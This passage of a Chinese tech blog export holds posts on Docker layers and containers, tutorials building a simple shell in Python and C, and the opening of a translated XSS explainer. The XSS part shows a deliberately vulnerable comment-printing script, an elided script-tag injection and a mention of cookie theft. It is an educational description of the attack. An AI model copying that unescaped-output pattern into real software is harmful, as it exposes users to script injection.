layer）的统一视角，也许这个定义有些难以理解，下面的这张图能够帮助读者理解镜像的定义。 从左边我们看到了多个只读层，它们重叠在一起。除了最下面一层，其它层都会有一个指针指向下一层。这些层是Docker内部的实现细节，并且能够在主机（译者注：运行Docker的机器）的文件系统上访问到。统一文件系统（union file system）技术能够将不同的层整合成一个文件系统，为这些层提供了一个统一的视角，这样就隐藏了多层的存在，在用户的角度看来，只存在一个文件系统。我们可以在图片的右边看到这个视角的形式。 你可以在你的主机文件系统上找到有关这些层的文件。需要注意的是，在一个运行中的容器内部，这些层是不可见的。在我的主机上，我发现它们存在于/var/lib/docker/aufs目录下。 123456789101112sudo tree -L 1 /var/lib/docker//var/lib/docker/├── aufs├── containers├── graph├── init├── linkgraph.db├── repositories-aufs├── tmp├── trust└── volumes7 directories, 2 files 容器定义容器（container）的定义和镜像（image）几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。 细心的读者可能会发现，容器的定义并没有提及容器是否在运行，没错，这是故意的。正是这个发现帮助我理解了很多困惑。 要点：容器 = 镜像 + 读写层。并且容器的定义并没有提及是否要运行容器。 接下来，我们将会讨论运行态容器。 运行态容器定义一个运行态容器（running container）被定义为一个可读写的统一文件系统加上隔离的进程空间和包含其中的进程。下面这张图片展示了一个运行中的容器。 正是文件系统隔离技术使得Docker成为了一个前途无量的技术。一个容器中的进程可能会对文件进行修改、删除、创建，这些改变都将作用于可读写层（read-write layer）。下面这张图展示了这个行为。 我们可以通过运行以下命令来验证我们上面所说的： 1docker run ubuntu touch happiness.txt 即便是这个ubuntu容器不再运行，我们依旧能够在主机的文件系统上找到这个新文件。 12find / -name happiness.txt/var/lib/docker/aufs/diff/860a7b...889/happiness.txt 镜像层定义为了将零星的数据整合起来，我们提出了镜像层（image layer）这个概念。下面的这张图描述了一个镜像层，通过图片我们能够发现一个层并不仅仅包含文件系统的改变，它还能包含了其他重要信息。 元数据（metadata）就是关于这个层的额外信息，它不仅能够让Docker获取运行和构建时的信息，还包括父层的层次信息。需要注意，只读层和读写层都包含元数据。 除此之外，每一层都包括了一个指向父层的指针。如果一个层没有这个指针，说明它处于最底层。 Metadata Location: 我发现在我自己的主机上，镜像层（image layer）的元数据被保存在名为”json”的文件中，比如说： 1/var/lib/docker/graph/e809f156dc985.../json e809f156dc985…就是这层的id 一个容器的元数据好像是被分成了很多文件，但或多或少能够在/var/lib/docker/containers/目录下找到，就是一个可读层的id。这个目录下的文件大多是运行时的数据，比如说网络，日志等等。 全局理解现在，让我们结合上面提到的实现细节来理解Docker的命令。 docker create docker create 命令为指定的镜像（image）添加了一个可读写层，构成了一个新的容器。注意，这个容器并没有运行。 docker start Docker start命令为容器文件系统创建了一个进程隔离空间。注意，每一个容器只能够有一个进程隔离空间。 docker run 看到这个命令，读者通常会有一个疑问：docker start 和 docker run命令有什么区别。 从图片可以看出，docker run 命令先是利用镜像创建了一个容器，然后运行这个容器。这个命令非常的方便，并且隐藏了两个命令的细节，但从另一方面来看，这容易让用户产生误解。 我认为docker run命令类似于git pull命令。git pull命令就是git fetch 和 git merge两个命令的组合，同样的，docker run就是docker create和docker start两个命令的组合。 docker ps docker ps 命令会列出所有运行中的容器。这隐藏了非运行态容器的存在，如果想要找出这些容器，我们需要使用下面这个命令。 docker ps –a docker ps –a命令会列出所有的容器，不管是运行的，还是停止的。 docker images docker images命令会列出了所有顶层（top-level）镜像。实际上，在这里我们没有办法区分一个镜像和一个只读层，所以我们提出了top-level镜像。只有创建容器时使用的镜像或者是直接pull下来的镜像能被称为顶层（top-level）镜像，并且每一个顶层镜像下面都隐藏了多个镜像层。 docker images –a docker images –a命令列出了所有的镜像，也可以说是列出了所有的可读层。如果你想要查看某一个image-id下的所有层，可以使用docker history来查看。 docker stop docker stop命令会向运行中的容器发送一个SIGTERM的信号，然后停止所有的进程。 docker kill docker kill 命令向所有运行在容器中的进程发送了一个不友好的SIGKILL信号。 docker pause docker stop和docker kill命令会发送UNIX的信号给运行中的进程，docker pause命令则不一样，它利用了cgroups的特性将运行中的进程空间暂停。具体的内部原理你可以在这里找到：https://www.kernel.org/doc/Doc … m.txt，但是这种方式的不足之处在于发送一个SIGTSTP信号对于进程来说不够简单易懂，以至于不能够让所有进程暂停。 docker rm docker rm命令会移除构成容器的可读写层。注意，这个命令只能对非运行态容器执行。 docker rmi docker rmi 命令会移除构成镜像的一个只读层。你只能够使用docker rmi来移除最顶层（top level layer）（也可以说是镜像），你也可以使用-f参数来强制删除中间的只读层。 docker commit docker commit命令将容器的可读写层转换为一个只读层，这样就把一个容器转换成了不可变的镜像。 docker build docker build命令非常有趣，它会反复的执行多个命令。 我们从上图可以看到，build命令根据Dockerfile文件中的FROM指令获取到镜像，然后重复地1）run（create和start）、2）修改、3）commit。在循环中的每一步都会生成一个新的层，因此许多新的层会被创建。 docker exec docker exec 命令会在运行中的容器执行一个新进程。 docker inspect or docker inspect命令会提取出容器或者镜像最顶层的元数据。 docker save docker save命令会创建一个镜像的压缩文件，这个文件能够在另外一个主机的Docker上使用。和export命令不同，这个命令为每一个层都保存了它们的元数据。这个命令只能对镜像生效。 docker export docker export命令创建一个tar文件，并且移除了元数据和不必要的层，将多个层整合成了一个层，只保存了当前统一视角看到的内容（译者注：expoxt后的容器再import到Docker中，通过docker images –tree命令只能看到一个镜像；而save后的镜像则不同，它能够看到这个镜像的历史镜像）。 docker history docker history命令递归地输出指定镜像的历史镜像。 Docker与虚拟机的区别Docker 容器并非虚拟机 理解虚拟机使用虚拟机运行多个相互隔离的应用时，如下图: 从下到上理解上图: 基础设施(Infrastructure)。它可以是你的个人电脑，数据中心的服务器，或者是云主机。 主操作系统(Host Operating System)。你的个人电脑之上，运行的可能是MacOS，Windows或者某个Linux发行版。 虚拟机管理系统(Hypervisor)。利用Hypervisor，可以在主操作系统之上运行多个不同的从操作系统。类型1的Hypervisor有支持MacOS的HyperKit，支持Windows的Hyper-V以及支持Linux的KVM。类型2的Hypervisor有VirtualBox和VMWare。 从操作系统(Guest Operating System)。假设你需要运行3个相互隔离的应用，则需要使用Hypervisor启动3个从操作系统，也就是3个虚拟机。这些虚拟机都非常大，也许有700MB，这就意味着它们将占用2.1GB的磁盘空间。更糟糕的是，它们还会消耗很多CPU和内存。 各种依赖。每一个从操作系统都需要安装许多依赖。如果你的的应用需要连接PostgreSQL的话，则需要安装libpq-dev；如果你使用Ruby的话，应该需要安装gems；如果使用其他编程语言，比如Python或者Node.js，都会需要安装对应的依赖库。 应用。安装依赖之后，就可以在各个从操作系统分别运行应用了，这样各个应用就是相互隔离的。 理解Docker容器使用Docker容器运行多个相互隔离的应用时，如下图: 不难发现，相比于虚拟机，Docker要简洁很多。因为我们不需要运行一个臃肿的从操作系统了。 从下到上理解上图: 基础设施(Infrastructure)。 主操作系统(Host Operating System)。所有主流的Linux发行版都可以运行Docker。对于MacOS和Windows，也有一些办法”运行”Docker。 Docker守护进程(Docker Daemon)。Docker守护进程取代了Hypervisor，它是运行在操作系统之上的后台进程，负责管理Docker容器。 各种依赖。对于Docker，应用的所有依赖都打包在Docker镜像中，Docker容器是基于Docker镜像创建的。 应用。应用的源代码与它的依赖都打包在Docker镜像中，不同的应用需要不同的Docker镜像。不同的应用运行在不同的Docker容器中，它们是相互隔离的。 对比虚拟机与DockerDocker守护进程可以直接与主操作系统进行通信，为各个Docker容器分配资源；它还可以将容器与主操作系统隔离，并将各个容器互相隔离。虚拟机启动需要数分钟，而Docker容器可以在数毫秒内启动。由于没有臃肿的从操作系统，Docker可以节省大量的磁盘空间以及其他系统资源。 说了这么多Docker的优势，大家也没有必要完全否定虚拟机技术，因为两者有不同的使用场景。虚拟机更擅长于彻底隔离整个运行环境。例如，云服务提供商通常采用虚拟机技术隔离不同的用户。而Docker通常用于隔离不同的应用，例如前端，后端以及数据库。","link":"/2018/12/23/我理解的docker/"},{"title":"自己动手写Shell(二)——Python实现","text":"Shell的基本生命周期无论使用什么语言实现，Shell 的生命周期都是一样的，主要做三件事： 初始化：Shell 会在初始化时读入和执行配置文件。这会改变 Shell 接下来各方面的行为。 解释：Shell 在解释阶段（也就是等待用户输入的阶段）读入标准输入的命令并解释执行。 终结：在用户输入 shutdown 命令后，Shell 会释放掉占用的内存并终结自己。 使用Python实现的 Shell 主函数如下： 1234567def main(): # 在执行 shell_loop 函数进行循环监听之前，首先进行初始化 # 即建立命令与函数映射关系表 init() # 预处理命令的主程序 shell_loop() 和 C 中的主函数相比，多了一个init() 函数，该函数是用来注册函数关系映射表的，在 Shell 正式启动前将一些内置的命令先加载好，各个内置的命令写在主目录下的 func 文件夹下，每一个命令都对应一个.py文件。这个功能在 C 中的 Shell也有实现，只不过是通过字符串数组和函数指针数组实现的，且全部写在 main.c 文件里。在 Python 中这样实现的目的是为了降低代码的耦合度，使得增添命令变得更加灵活。如果想为我们的 Shell 增加或减少一个命令，只需要在 func 文件下增加 或减少一个.py文件即可，不需要频繁改动主函数。 init() 函数的实现如下（暂时只实现了这四个命令）： 12345678910111213141516def register_command(name, func): \"\"\" 注册命令，使命令与相应的处理函数建立映射关系 @Param name:命令名 @param func:函数名 \"\"\" built_in_cmds[name] = func def init(): \"\"\" 注册所有命令 \"\"\" register_command(\"cd\", cd) register_command(\"exit\", exit) register_command(\"getenv\", getenv) register_command(\"history\", history) Shell的基本循环Shell 的基本循环也是通用的以下三点： 读入：从标准输入中读入命令 解析：将执行的命令和其参数解析出来输入程序执行 执行：根据命令和参数执行程序 用 Python 的实现如下： 123456789101112131415161718192021222324252627282930def shell_loop(): status = SHELL_STATUS_RUN while status == SHELL_STATUS_RUN: #打印命令提示符，如'[&lt;user&gt;@&lt;hostname&gt; &lt;base_dir&gt;]$' display_cmd_prompt() #忽略 Ctrl-Z 或Ctrl-C 信号 ignore_signals() try: #读取命令 cmd = sys.stdin.readline() #解析命令 #将命令进行拆分，返回一个列表 cmd_tokens = tokenize(cmd) #预处理函数 #将命令中的环境变量用真实值进行替换 #比如讲$HOME这样的变量替换为实际值 cmd_tokens = preprocess(cmd_tokens) #执行命令，并返回shell的状态 status = execute(cmd_tokens) except: #sys.exc_info函数返回一个包含三个值的远足（type,value,traceback) #这三个值产生于最近一次被处理的异常 #而我们只需要获取中间的值 _, err, _ = sys.exc_info() print(err) 虽然没有 C 中实现的那么简洁清楚，但我增加了更多的功能。比如：打印命令提示符，在 C 中只是打印一个’&gt;’；忽略 Ctrl-z 和 Ctrl-c 终止信号；在循环内加入了异常检测语句。这样的 Shell 比起 C 里的 Shell 看起来就显得高大上多了。 显示命令提示符的代码如下： 12345678910111213141516171819202122232425#展示命令提示符，行如'[&lt;user&gt;@&lt;hostname&gt; &lt;base_dir&gt;]$'def display_cmd_prompt(): # getpass.getuser 用于获取当前用户名 user = getpass.getuser() # socket.gethostname() 返回当前运行 python 程序的机器的主机名 hostname = socket.gethostname() # 获取当前工作路径 cwd = os.getcwd() # 获取路径 cwd 的最低一级目录 base_dir = os.path.basename(cwd) # 如果用户当前位于用户的根目录之下，使用'~'代替目录名 home_dir = os.path.expanduser('~') if cwd == home_dir: base_dir = '~' # 输出命令提示符 if platform.system() != \"Windows\": sys.stdout.write(\"[\\033[1;33m%s\\033[0;0m@%s \\033[1;36m%s\\033[0;0m] $\"%(user, hostname, base_dir)) else: sys.stdout.write(\"[%s@%s %s]$ \" % (user, hostname, base_dir)) sys.stdout.flush() 分别通过 Python 标准库中的函数获取了当前用户名、主机名和工作路径。并判断如果是用户目录则用’~’替代。对于非 Windows 系统输出带颜色的代码。 忽略终止信号的代码如下： 12345678def ignore_signals(): if platform.system() != \"Window\": # 忽略 Ctrl-Z 信号 signal.signal(signal.SIGTSTP, signal.SIG_IGN) #忽略 Ctrl-C 信号 signal.signal(signal.SIGINT, signal.SIG_IGN) 在读入命令时直接使用了 Python 中的标准读入，所以就没有单独为读入写一个函数了。 解析一行首先将读到的行进行分词，我直接使用了 Python 库 shlex 中的 split() 方法，该方法按 Shell 的语法规则对字符串进行分割。 1234567def tokenize(string): # 将 string 按 shell 的语法规则进行分割 # 返回 string 的分割列表 # 其实就是按空格符将命令与参数分开 # 比如， 'ls -l /home/yifeng' 划分之后就是 # ['ls', '-l', '/home/yifeng'] return shlex.split(string) 相较于 C 中的 Shell 分词之后还增加了一个预处理函数，将输入的环境变量进行替换，这样就可以输入变量了。 预处理函数如下： 123456789101112def preprocess(tokens): # 用于存储处理之后的 token processed_token = [] for token in tokens: if token.startswith('$'): # os.getenv() 用于获取环境变量的值，比如 'HOME' # 变量不存在则返回空 processed_token.append(os.getenv(token[1:])) else: processed_token.append(token) return processed_token 解释执行在读取了预处理后的命令行参数后，便可以进行解释执行了，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738def execute(cmd_tokens): # 'a' 模式表示以添加的方式打开指定文件 # 这个模式下文件对象的 write 操作不会覆盖文件原有的信息，而是添加到文件原有信息之后 with open(HISTORY_PATH, 'a') as history_file: history_file.write(' '.join(cmd_tokens) + os.linesep) if cmd_tokens: # 获取命令 cmd_name = cmd_tokens[0] # 获取命令参数 cmd_args = cmd_tokens[1:] # 如果当前命令在命令表中 # 则传入参数，调用相应的函数进行执行 if cmd_name in built_in_cmds: return built_in_cmds[cmd_name](cmd_args) # 监听 Ctrl-C 信号 signal.signal(signal.SIGINT, handler_kill) # 如果当前系统不是 Windows # 则创建子进程 if platform.system() != \"Windows\": # Unix 平台 # 调用子进程执行命令 p = subprocess.Popen(cmd_tokens) #父进程从子进程读取数据，直到读取到EOF # 这里主要用来等待子进程终止运行 p.communicate() else: # Windows 平台 command = \"\" command = ' '.join(cmd_tokens) # 执行 command os.system(command) # 返回状态 return SHELL_STATUS_RUN 由于实现了 history 命令，所以在每一次执行命令时都会将该命令写入保存历史命令的文件 history_file 中，方便调用 history() 时读取。接下来判断输入的命令是否是内置实现的命令，如果是，则直接调用。不是的话则会判断当前操作系统类型，并根据操作系统类型调用不同的执行命令的函数。 总结至此，用 Python 实现的 Shell 就全部介绍完毕了。相较于 C 中的实现，我做了以下几点优化： 优化了命令提示符功能，看起来更专业 低耦合的设计，可以动态地添加删除命令 根据不同的操作系统类型进行了适配（C中的实现仅支持 Linux） 可以在输入中使用变量 总之，Shell 就是这么一个读取用户命令，并将其解释执行的程序。通过实现这么一个简单的 Shell 让我对平时编程最常打交道的程序有了更清楚的认识，十分有趣。强烈建议大家自己动手实现一遍。 最后是各个命令的具体实现代码： cd: 12345678from .constants import *def cd(args): if len(args) &gt; 0: os.chdir(args[0]) else: os.chdir(os.getenv('HOME')) return SHELL_STATUS_RUN exit: 1234from .constants import *def exit(args): return SHELL_STATUS_STOP getenv: 123456from .constants import *def getenv(args): if len(args) &gt; 0: print(os.getenv(args[0])) return SHELL_STATUS_RUN history: 1234567891011121314151617import sysfrom .constants import *def history(args): with open(HISTORY_PATH, 'r') as history_file: lines = history_file.readlines() limit = len(lines) if len(args) &gt; 0: limit = int(args[0]) start = len(lines) - limit for line_num, line in enumerate(lines): if line_num &gt;= start: sys.stdout.write('%d %s' %(line_num + 1, line)) sys.stdout.flush() return SHELL_STATUS_RUN","link":"/2018/12/19/自己动手写Shell——Python实现/"},{"title":"自己动手写Shell(一）——C实现","text":"本文参考自Write a Shell in C Shell的基本生命周期 让我们自顶向下的思考一下 Shell。一个 Shell 在它的生命周期里主要做了三件事。 初始化：Shell 会在初始化时读入和执行配置文件。这会改变 Shell 接下来各方面的行为。 解释：Shell 在解释阶段（也就是等待用户输入的阶段）读入标准输入的命令并解释执行。 终结：在用户输入 shutdown 命令后，Shell 会释放掉占用的内存并终结自己。 这些步骤是很通用的，它们可以应用在任何程序中，我们将在我们的 Shell 中利用它们作为基础。我们的 Shell会足够简单，以至于没有任何配置文件，也不会有任何 shutdown 命令。因此，我们仅仅调用循环函数然后结束它。但需要注意的是，在程序的生命周期中循环只是一个基础的组成部分，真正的架构往往会复杂的多。 1234567891011int main(int argc, char **argv){ // Load config files, if any. // Run command loop. lsh_loop(); // Perform any shutdown/cleanup. return EXIT_SUCCESS;} 可以在上面的代码中看到，我只使用了一个函数，lsh_loop()。它将会循环执行并解释命令。我们将在接下来的部分看到它的具体实现。 Shell 的基本循环我们已经思考过 Shell 程序是如何启动的。现在，考虑基本的程序逻辑：Shell 在执行循环的时候做了什么？ 答案是以下三点： 读入：从标准输入中读入命令 解析：将执行的命令和其参数解析出来输入程序执行 执行：根据命令和参数执行程序 将以上三点表述成代码放入 lsh_loop(): 12345678910111213141516void lsh_loop(void){ char *line; char **args; int status; do { printf(\"&gt; \"); line = lsh_read_line(); args = lsh_split_line(line); status = lsh_execute(args); free(line); free(args); } while (status);} 让我们看看这段代码。开头是几行声明语句。后面的 do-while 循环在检查变量的状态方面更加地方便，因为在检查之前就已经执行了一次了。在循环里，我们打印了一个提示符，调用了一个函数来读入一行，再调用了一个函数来划分读入行的参数，然后执行这些参数。最后我们释放了 line 和 arguments 变量。注意我们使用了一个状态变量 status （由 lsh_execute()返回）来决定何时终止循环。 读入一行从标准输入中读入一行听起来简单，但用 C 实现起来还是有点麻烦的。难受的事情是，你并不知道在这一段时间里用户会往 shell 中输入多少文本。你不能简单地就分配一个块并期望输入不会溢出。而是要在启动的时候分配一个块，然后在溢出的时候重新分配更多的空间。这在 C 里是一个普遍的策略，我们将会在 lsh_read_line()中实现。 12345678910111213141516171819202122232425262728293031323334353637#define LSH_RL_BUFSIZE 1024char *lsh_read_line(void){ int bufsize = LSH_RL_BUFSIZE; int position = 0; char *buffer = malloc(sizeof(char) * bufsize); int c; if (!buffer) { fprintf(stderr, \"lsh: allocation error\\n\"); exit(EXIT_FAILURE); } while (1) { // Read a character c = getchar(); // If we hit EOF, replace it with a null character and return. if (c == EOF || c == '\\n') { buffer[position] = '\\0'; return buffer; } else { buffer[position] = c; } position++; // If we have exceeded the buffer, reallocate. if (position &gt;= bufsize) { bufsize += LSH_RL_BUFSIZE; buffer = realloc(buffer, bufsize); if (!buffer) { fprintf(stderr, \"lsh: allocation error\\n\"); exit(EXIT_FAILURE); } } }} 第一部分有很多的声明。函数的主要内容在while(1)循环中（显然是无限循环）。在循环中，我们读入一个字符并把它存储为 int 而不是 char ，这很重要！EOF是一个 Integer，而不是一个 Character。如果你想在条件语句中检查它，就得把它声明为 int。这是一个 C 语言初学者普遍会犯的错误。如果读入的是一个新行或者 EOF，我们会终止当前的读入并返回。否则我们将读到的字符添加到缓存字符串中。 接下来，我们会判断新的字符是否会超过当前的缓存大小。如实是的话，我们在继续读入前重新分配我们的缓存大小（同时检查分配错误）。这些都是值得做的。 对较新版本 C 函数库比较熟悉的人可能会察觉到在 stdio.h 中的 getline() 可以完成大部分我们实现的功能。但是尝试着自己实现一下 C 标准库的函数也没什么不好。使用 getline 的代码如下： 1234567char *lsh_read_line(void){ char *line = NULL; ssize_t bufsize = 0; // have getline allocate a buffer for us getline(&amp;line, &amp;bufsize, stdin); return line;} 解析一行现在我们再看最初的循环，我们已经实现了 lsh_read_line()，所以可以获取读入的行了。之后我们需要把读入的行解析为一系列参数。这里我将做一些简化，不允许在命令行参数中出现引号和反斜杠，而是简单地通过空格来分隔每一个参数。因此命令echo &quot;this message&quot; 将不会通过一个参数调用echo，而是通过两个参数&quot;this&quot;和message&quot;调用。 在这些简化后，我们需要做的就是使用空格作为分隔符来对输入字符串做词法分析。这意味着我们可以调用标准库函数 strtok 来为我们做一些麻烦的事。 1234567891011121314151617181920212223242526272829303132#define LSH_TOK_BUFSIZE 64#define LSH_TOK_DELIM \" \\t\\r\\n\\a\"char **lsh_split_line(char *line){ int bufsize = LSH_TOK_BUFSIZE, position = 0; char **tokens = malloc(bufsize * sizeof(char*)); char *token; if (!tokens) { fprintf(stderr, \"lsh: allocation error\\n\"); exit(EXIT_FAILURE); } token = strtok(line, LSH_TOK_DELIM); while (token != NULL) { tokens[position] = token; position++; if (position &gt;= bufsize) { bufsize += LSH_TOK_BUFSIZE; tokens = realloc(tokens, bufsize * sizeof(char*)); if (!tokens) { fprintf(stderr, \"lsh: allocation error\\n\"); exit(EXIT_FAILURE); } } token = strtok(NULL, LSH_TOK_DELIM); } tokens[position] = NULL; return tokens;} 这段代码看起来和之前的 lsh_read_line() 很类似，我们使用了同样的缓存和动态拓展策略。但这一次我们使用了 null 终结的指针数组而不是 null 终结的字符数组。 在一开始，我们调用了strtok来划分词元。它返回第一个词元的指针。strtok() 事实上做的是返回你给的字符串内部的指针，并将每一个词元的末尾（分割符所在地址）置\\0 （C语言中表示字符串结束的标志）。我们将每一个字符指针保存在 tokens 中。 最后，我们在需要的时候重新分配内存。这个过程将会重复进行直到所有的词元都被strtok返回，然后将 null 放在 tokens 末尾。 现在我们有了一组词元了，可以准备开始执行了。 Shell 启动进程现在我们来到了编写 Shell 的关键。启动线程是 Shell 的主要功能。所以编写一个 shell 意味着你需要明确地知道线程里发生了什么以及它们如何启动。因此在正式开写之前谈一谈 Unix 中的线程是很有必要的。 在 Unix 中仅有两种启动线程的方式。第一种是 Init 进程。当 unix 电脑启动时，它的内核会被加载。一旦内核被加载并初始化后，内核将会启动唯一的一个进程，Init 进程。Init 进程会在电脑启动后一直运行，并管理加载剩下的你所需要的进程。 因为大部分程序都不是 Init 进程，那么就只有一种常用的方式来启动进程了：fork() 系统调用。当这个函数被调用后，操作系统会构建一个该进程的副本并启动它。原进程称为父进程，新进程称为子进程。fork() 对子进程返回0，对父进程返回子进程的进程ID数（PID）。这意味着启动新进程的唯一方式是通过一个已存在的进程复制它自己并启动。 这存在一个问题。就是当你想要运行一个新程序的时候，你并不想要当前进程的复制——你就是想要运行一个不同的程序。这就是 exec() 系统调用做的事情。它用一个全新的程序替代了当前进程。这意味着当你调用exec() 时，操作系统将会终止当前进程，加载新的程序，然后在当前位置启动新的程序。一个程序不会从exec()中获得返回值（除非它报错）。 有了这两个系统调用，我们就有了在 Unix 系统中启动新进程的砖头。首先，一个已存的进程 fork 它本身得到两个一样的进程。然后子进程执行 exec() 来用新程序替换掉它自己。父进程可以继续做其它事情，或者使用wait() 系统调用来等待子进程执行完。 通过上述的背景知识的补充，下面的用于启动一个新程序的代码将会变得很好理解： 123456789101112131415161718192021222324int lsh_launch(char **args){ pid_t pid, wpid; int status; pid = fork(); if (pid == 0) { // Child process if (execvp(args[0], args) == -1) { perror(\"lsh\"); } exit(EXIT_FAILURE); } else if (pid &lt; 0) { // Error forking perror(\"lsh\"); } else { // Parent process do { wpid = waitpid(pid, &amp;status, WUNTRACED); } while (!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status)); } return 1;} 这个函数将我们之前得到的参数数组作为参数。之后调用fork() ，保存它的返回值。当fork() 返回时，我们实际上有两个正在运行的进程。子进程将会执行第一个 if 条件语句（where pid == 0）。 在子进程中，我们想要运行用户输入的命令。所以，我们使用了exec()的变种之一execvp()。execvp() 略微有一些不同。它将希望运行的程序名和一个字符串数组（也被成为’vector’,这就是其中’v’的由来）作为参数。其中的’p’表示不需要提供运行程序的完整路径，只需要给出它的名字，操作系统将会在系统路径中自动搜索它。 如果 exec 命令返回-1，我们就知道产生了一个 error。所以我们使用perror来打印系统的错误信息，和我们的 Shell 名一样，这样我们就知道这个 error 来自哪里了。之后，我们退出函数，使得 Shell 能继续运行。 第二个条件（pid &lt; 0）检查了是否 fork() 出现了error。如果是，我们打印 error 并继续运行 Shell——这里并没有提示用户出现了 error 并让他们决定是否需要退出。 第三个条件意味着fork() 成功执行了。父进程将会暂时挂起，等待子进程执行完毕。我们使用waitpid() 来等待进程状态的改变。不幸的是，waitpid() 有很多选项（像exec() ）。进程可以通过很多方式改变状态，并不是所有状态的改变都意味着进程结束。一个进程可以是退出（通常会留下错误码），也可以被信号杀死。我们使用waitpid() 提供的宏来等待进程退出或者被杀死。之后该函数将会返回1，作为调用函数的信号来提示应该再次进行输入了。 Shell 内置方法你也许已经察觉到了lsh_loop() 函数调用的是lsh_execute() 函数，但是在上一部分我们的函数名为lsh_launch() 。这是故意为之！大部分 Shell 执行的命令会启动一个进程，但并不是所有的命令都需要。它们中的一些就内置在 Shell 中。 比如你想要改变当前目录，你需要使用函数chdir() 。问题在于，目录是当前进程的一项属性。也就是说，如果你写了一个程序调用了cd 改变了目录，它将改变调用程序自己的当前目录。它的父进程的当前目录并没有改变。所以是 Shell 程序自身需要执行chdir() ，来更新它自己的当前目录。这样才能在启动子进程后，子进程们才会继承这个更新后的目录。 类似的，如果程序名为exit ，它将不会退出调用它的 Shell，而是退出直接调用的子进程。这个命令也需要内置在 Shell 里。大部分 Shell 通过运行配置脚本（~/.bashrc）来配置。这些脚本使用能改变 Shell 本身行为的命令。这些命令都是内置在 Shell 里的。 所以我们添加一些命令在 Shell 里是很有意义的。我添加在我的 Shell 里的命令是 cd，exit 和 help。它们的实现如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/* Function Declarations for builtin shell commands: */int lsh_cd(char **args);int lsh_help(char **args);int lsh_exit(char **args);/* List of builtin commands, followed by their corresponding functions. */char *builtin_str[] = { \"cd\", \"help\", \"exit\"};int (*builtin_func[]) (char **) = { &amp;lsh_cd, &amp;lsh_help, &amp;lsh_exit};int lsh_num_builtins() { return sizeof(builtin_str) / sizeof(char *);}/* Builtin function implementations.*/int lsh_cd(char **args){ if (args[1] == NULL) { fprintf(stderr, \"lsh: expected argument to \\\"cd\\\"\\n\"); } else { if (chdir(args[1]) != 0) { perror(\"lsh\"); } } return 1;}int lsh_help(char **args){ int i; printf(\"Stephen Brennan's LSH\\n\"); printf(\"Type program names and arguments, and hit enter.\\n\"); printf(\"The following are built in:\\n\"); for (i = 0; i &lt; lsh_num_builtins(); i++) { printf(\" %s\\n\", builtin_str[i]); } printf(\"Use the man command for information on other programs.\\n\"); return 1;}int lsh_exit(char **args){ return 0;} 这段代码包含三个部分。第一个部分是内置函数的前向声明。一个前向声明意味着你声明了一个函数（并没有定义），因此你能在定义它之前使用它的函数名。这样做的原因是lsh_help() 使用了内置函数名数组，数组中包含了lsh_help() 。打破这个依赖循环的最清晰的方式就是前向声明。 下一个部分是一个包含了内建命令名的数组以及一个包含命令名对应函数的数组。也就是说，在将来想要添加内建命令的时候只要修改这些数组就好了，不需要在代码的某处地方编辑一个非常复杂的 switch 语句。如果你对builtin_func 的声明感到困惑，那就对了！这是一个包含函数指针的数组，它将字符串数组作为输入并返回一个整型数。在 C 语言里，任何涉及函数指针的声明都是很复杂的，这样做的好处是，当你想要调用一系列函数时可以直接通过数组名加索引调用，而不是用硬编码的方式直接调用函数本身。 执行命令最后要做的就是实现 lsh_execute() ，这个函数将会启动新线程或者调用内置方法。 1234567891011121314151617int lsh_execute(char **args){ int i; if (args[0] == NULL) { // An empty command was entered. return 1; } for (i = 0; i &lt; lsh_num_builtins(); i++) { if (strcmp(args[0], builtin_str[i]) == 0) { return (*builtin_func[i])(args); } } return lsh_launch(args);} 这段代码做的就是检查输入命令是否是内置命令，如果是的话就运行它。如果不是则调用lsh_launch() 启动一个新进程。 整合代码到这里一个简易 Shell 所需要的所有代码就都实现了。将上面所有的代码片段复制到 main.c 文件里。在将下列头文件包含在文件起始位置。 1#include &lt;sys/wait.h&gt; waitpid() and associated macros 1#include &lt;unistd.h&gt; chdir() fork() exec() pid_t 1#include &lt;stdlib.h&gt; malloc() realloc() free() exit() execvp() EXIT_SUCCESS, EXIT_FAILURE 1#include &lt;stdio.h&gt; fprintf() printf() stderr getchar() perror() 1#include &lt;string.h&gt; strcmp() strtok() 保存退出后，执行 gcc -o main main.c 进行编译，然后执行./main 运行，lsh就启动了！","link":"/2018/12/10/自己动手写Shell——C实现/"},{"title":"详解XSS（译）","text":"一、XSS 概述什么是XSS？Cross-site scripting(XSS)是一种能够在他人浏览器中执行恶意 JavaScript代码的代码注入攻击。 攻击者不需要直接接触受害者。他可以直接利用受害者访问的网站的漏洞来让恶意代码在其浏览器中执行。对于受害者的浏览器来说，恶意的 JavaScript 代码表现的就像是网站合法的一部分，而网站的行为也完全不像是攻击者的帮凶。 恶意的 JavaScript 代码是如何被注入的？让攻击者能在受害者浏览器上运行恶意代码的唯一方式就是在受害者要访问的网站中的某一个页面里注入代码。这会发生在网站直接在它的页面中包含加载了用户输入，这样攻击者就可以在页面中插入字符串，这段字符串会被受害者的浏览器当做代码执行。 在下面的例子中，一个简单的服务器脚本被用来展示网站上最新的评论： 1234print \"&lt;html&gt;\"print \"Latest comment:\"print database.latestCommentprint \"&lt;/html&gt;\" 这段脚本假设评论仅包含文本。然而，用户输入被直接加载了，攻击者可以提交这样的评论：&lt;script&gt;...&lt;script&gt;。任何用户访问页面都会接收到下列回应： 1234&lt;html&gt;Latest comment:&lt;script&gt;...&lt;/script&gt;&lt;/html&gt; 当用户浏览器加载了页面后，它将执行包含在&lt;script&gt; 标签中的任意 JavaScript 脚本。攻击者已经成功地实施了攻击。 什么是恶意 JavaScript 脚本？起初，能在受害者的浏览器中执行 JavaScript 脚本看起来并不是那么恶意。毕竟 JavaScript 运行在一个及其受限的环境，很难访问用户文件和操作系统。事实上，你可以打开你的浏览器的控制台（console）并执行任何 JavaScript 代码，你会发现你很难对你的计算机造成什么实质的损害。 然而，JavaScript 代码也是有可能变得很有恶意的，尤其是当你考虑下列情况时： JavaScript 代码访问了一些用户敏感信息，例如：cookies。 JavaScript 代码可以使用 XMLHttpRequest和其他机制来发送包含任何内容的 HTTP 请求到任意目的地。 JavaScript 代码可以通过使用 DOM 操作来对当前页面的 HTML 文件做任意修改。 这些情况组合在一起会导致非常严重的安全问题，也是我接下来会解释的。 恶意 JavaScript 脚本带来的后果在其他用户的浏览器上执行任意 JavaScript 代码允许攻击者实施下列攻击： Cookie 剽窃：攻击者可以使用document.cookie 来访问受害者与网站相关的 